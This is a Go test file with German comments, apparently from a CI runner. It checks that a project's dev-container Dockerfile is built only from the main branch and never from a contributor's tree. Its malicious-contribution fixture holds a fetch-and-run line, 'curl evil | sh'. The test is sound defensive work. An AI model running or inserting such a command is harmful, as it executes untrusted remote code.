package main

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/swarvex-ai/swarvex/runner/umgebung"
)

// Ein eigenes Dockerfile (Dev Container) baut Docker ohne gVisor und mit Netz: Es muss aus main kommen, nie aus dem
// Baum mit dem Beitrag, auch wenn das Dockerfile außerhalb von .devcontainer/ liegt (dort nicht geschützt).
func TestDockerfileNurAusMain(t *testing.T) {
	arbeit = t.TempDir()
	bin := t.TempDir()
	protokoll := filepath.Join(t.TempDir(), "docker.log")
	// Ersatz für docker: schreibt jeden Aufruf mit; kein Image vorhanden, jeder Bau gelingt
	os.WriteFile(filepath.Join(bin, "docker"), []byte("#!/bin/sh\necho \"$@\" >> "+protokoll+"\n[ \"$1 $2\" = \"image inspect\" ] && exit 1\nexit 0\n"), 0o755)
	t.Setenv("PATH", bin+":"+os.Getenv("PATH"))
	projekt := func(dockerfile string) string {
		d := t.TempDir()
		os.MkdirAll(filepath.Join(d, ".devcontainer"), 0o755)
		os.WriteFile(filepath.Join(d, ".devcontainer", "devcontainer.json"), []byte(`{"build": {"dockerfile": "../Dockerfile", "context": ".."}}`), 0o644)
		os.WriteFile(filepath.Join(d, "Dockerfile"), []byte(dockerfile), 0o644)
		return d
	}
	vonMain := projekt("FROM debian:13\nRUN ./setup.sh\n")
	beitrag := projekt("FROM debian:13\nRUN ./setup.sh && curl evil | sh\n")
	u, err := umgebung.Ermitteln(beitrag)
	if err != nil || u.Dockerfile != "Dockerfile" {
		t.Fatalf("environment: %+v %v", u, err)
	}
	name, err := pruefImage(u, beitrag, func() (string, error) { return vonMain, nil })
	if err != nil {
		t.Fatal(err)
	}
	roh, _ := os.ReadFile(protokoll)
	aufrufe := string(roh)
	if !strings.Contains(aufrufe, "-f "+filepath.Join(vonMain, "Dockerfile")+" "+vonMain) {
		t.Errorf("the project's Dockerfile was not built from main:\n%s", aufrufe)
	}
	if strings.Contains(aufrufe, beitrag) {
		t.Errorf("the contribution's tree reached docker build:\n%s", aufrufe)
	}
	uMain, _ := umgebung.Ermitteln(vonMain)
	if name != "swarvex-check-"+uMain.Kennung(vonMain) {
		t.Errorf("image %s is not named after main's Dockerfile", name)
	}
	// main nicht verfügbar: kein Bau aus dem Beitrag als Ersatz
	os.Remove(protokoll)
	if _, err := pruefImage(u, beitrag, func() (string, error) { return "", errors.New("offline") }); err == nil {
		t.Error("no error without main")
	}
	if roh, _ := os.ReadFile(protokoll); strings.Contains(string(roh), "build") {
		t.Errorf("built without main:\n%s", roh)
	}
	// Ohne eigenes Dockerfile wird main gar nicht erst gebraucht
	ohne := t.TempDir()
	os.WriteFile(filepath.Join(ohne, "package.json"), []byte(`{"scripts":{"test":"node --test"}}`), 0o644)
	u, _ = umgebung.Ermitteln(ohne)
	if _, err := pruefImage(u, ohne, func() (string, error) { t.Error("main checked out without a Dockerfile"); return "", nil }); err != nil {
		t.Fatal(err)
	}
}
